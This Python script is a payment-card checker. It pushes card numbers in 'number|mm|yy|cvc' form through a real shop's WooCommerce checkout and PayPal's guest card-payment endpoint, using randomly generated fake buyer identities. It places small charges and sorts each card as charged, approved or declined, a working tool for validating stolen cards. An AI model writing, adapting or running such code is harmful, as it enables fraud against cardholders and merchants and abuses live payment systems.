import requests
import re
import time
import random
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def generate_random_code(length=17):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choices(characters, k=length))

def process_card_pp(cc):
    try:
        n, mm, yy, cvc = cc.strip().split('|')
        
        if len(mm) == 1:
            mm = f'0{mm}'
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        r = requests.Session()
        
        # Generate random user data
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone()
        
        # Step 1: Add to cart
        files = {
            'quantity': (None, '1'),
            'add-to-cart': (None, '4451'),
        }
        multipart_data = MultipartEncoder(fields=files)
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'content-type': multipart_data.content_type,
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'user-agent': user,
        }
        r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data)
        
        # Step 2: Get checkout page
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'referer': 'https://switchupcb.com/cart/',
            'user-agent': user,
        }
        response = r.get('https://switchupcb.com/checkout/', headers=headers)
        
        # Extract nonces
        sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
        nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
        check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
        create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
        
        # Step 3: Update order review
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user,
        }
        params = {'wc-ajax': 'update_order_review'}
        data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3DHouda%26billing_last_name%3DAlaa%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DNew%2520York%26billing_address_2%3D%26billing_city%3DNew%2520York%26billing_state%3DNY%26billing_postcode%3D10080%26billing_phone%3D3008796324%26billing_email%3Dtapt1744%2540gmail.com%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
        r.post('https://switchupcb.com/', params=params, headers=headers, data=data)
        
        # Step 4: Create order
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user,
        }
        params = {'wc-ajax': 'ppc-create-order'}
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
            'createaccount': False,
            'save_payment_method': False,
        }
        response = r.post('https://switchupcb.com/', params=params, headers=headers, json=json_data)
        
        id = response.json()['data']['id']
        pcp = response.json()['data']['custom_id']
        
        # Step 5: Process payment
        session_id = f'uid_{generate_random_code(10)}_{generate_random_code(11)}'
        button_session_id = f'uid_{generate_random_code(10)}_{generate_random_code(11)}'
        
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6', 
            'referer': 'https://www.paypal.com/smart/buttons',
            'user-agent': user,
        }
        params = {
            'sessionID': session_id,
            'buttonSessionID': button_session_id,
            'locale.x': 'ar_EG',
            'commit': 'true',
            'hasShippingCallback': 'false',
            'env': 'production',
            'country.x': 'EG',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
            'disable-card': '',
            'token': id,
        }
        r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)
        
        # Step 6: Submit card details
        headers = {
            'authority': 'my.tinyinstaller.top',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://my.tinyinstaller.top',
            'referer': 'https://my.tinyinstaller.top/checkout/',
            'user-agent': user,
        }
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm+'/20'+yy,
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': 'New York',
                    'line2': None,
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10080',
                    'country': 'US',
                },
                'email': acc,
                'currencyConversionType': 'VENDOR',
            },
        }
        response = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
        last = response.text
        
        # Determine response
        if ('ADD_SHIPPING_ERROR' in last or
            'NEED_CREDIT_CARD' in last or
            '"status": "succeeded"' in last or
            'Thank You For Donation.' in last or
            'Your payment has already been processed' in last or
            'Success ' in last):
            return {
                "gateway": "PayPal [2$]",
                "response": "CHARGED 2$ 🔥",
                "status": "APPROVED"
            }
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return {
                "gateway": "PayPal [2$]",
                "response": "OTP Required",
                "status": "APPROVED"
            }
        elif 'INVALID_SECURITY_CODE' in last:
            return {
                "gateway": "PayPal [2$]",
                "response": "APPROVED CCN",
                "status": "APPROVED"
            }
        elif 'INVALID_BILLING_ADDRESS' in last:
            return {
                "gateway": "PayPal [2$]",
                "response": "APPROVED - AVS",
                "status": "APPROVED"
            }
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return {
                "gateway": "PayPal [2$]",
                "response": "APPROVED - RESTRICTED",
                "status": "APPROVED"
            }
        else:
            try:
                message = response.json()['errors'][0]['message']
                code = response.json()['errors'][0]['data'][0]['code']
                return {
                    "gateway": "PayPal [2$]",
                    "response": message,
                    "status": "DECLINED"
                }
            except:
                return {
                    "gateway": "PayPal [2$]",
                    "response": "Unknown error",
                    "status": "ERROR"
                }
    
    except Exception as e:
        return {
            "gateway": "PayPal [2$]",
            "response": str(e),
            "status": "ERROR"
        }
